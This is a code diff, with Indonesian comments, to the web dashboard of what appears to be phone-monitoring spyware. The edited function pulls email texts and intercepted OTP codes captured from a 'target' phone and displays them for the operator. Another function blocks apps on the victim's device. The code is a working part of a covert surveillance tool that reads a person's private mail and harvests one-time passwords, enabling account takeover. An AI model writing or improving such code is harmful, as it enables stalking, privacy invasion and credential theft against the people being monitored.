@@ -215,29 +215,29 @@
         }
 
         function cekGmail() {
-            fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
-                var html = '';
-                
-                // Tampilin OTP duluan kalau ada
-                if (data.otp && data.otp !== "") {
-                    html += '<div style="background:#333; border:2px solid #00ff00; padding:15px; text-align:center; margin-bottom:15px; border-radius:8px;">' +
-                            '<div style="color:#aaa; font-size:12px;">KODE OTP TERDETEKSI:</div>' +
-                            '<div style="color:#00ff00; font-size:32px; font-weight:bold; letter-spacing:5px;">' + data.otp + '</div>' +
-                            '</div>';
+    fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
+        var html = '';
+        if (data.gmail && data.gmail.length > 0) {
+            data.gmail.forEach((item, index) => {
+                // Tampilin kotak OTP kalau ada angka
+                if (item.otp) {
+                    html += `<div style="background:#333; border:2px solid #00ff00; padding:15px; text-align:center; margin-bottom:10px; border-radius:8px;">
+                                <div style="color:#aaa; font-size:12px;">OTP TERDETEKSI:</div>
+                                <div style="color:#00ff00; font-size:28px; font-weight:bold; letter-spacing:5px;">${item.otp}</div>
+                             </div>`;
                 }
-
-                // Tampilin isi email
-                if (data.gmail && data.gmail !== "") {
-                    html += '<div style="color:#aaa; font-size:12px; margin-bottom:5px;">Isi Email:</div>';
-                    html += '<div style="background:#222; padding:15px; border-left:4px solid #ff6600; font-size:14px; white-space: pre-wrap; max-height:250px; overflow-y:auto;">' + data.gmail + '</div>';
-                } else {
-                    html += '<div style="text-align:center; color:#888; margin-top:20px;">Belum ada email yang dibuka. Coba buka satu email di aplikasi Gmail HP target.</div>';
-                }
-                
-                document.getElementById('modal-body').innerHTML = html;
+                // Tampilin isi email (teks)
+                html += `<div style="margin-bottom:20px;">
+                            <div style="color:#ff6600; font-size:12px; margin-bottom:5px;">Teks Email ${index + 1}:</div>
+                            <div style="background:#111; padding:10px; border-left:3px solid #555; font-size:12px; color:#ccc; max-height:150px; overflow-y:auto;">${item.text}</div>
+                         </div>`;
             });
+        } else {
+            html = '<div style="text-align:center; color:#888; margin-top:20px;">Belum ada email yang dibuka.</div>';
         }
-
+        document.getElementById('modal-body').innerHTML = html;
+    });
+}
         function simpanBlokir() {
             var apps = document.getElementById('blocked_input').value;
             if(!apps) return alert("Package name kosong!");
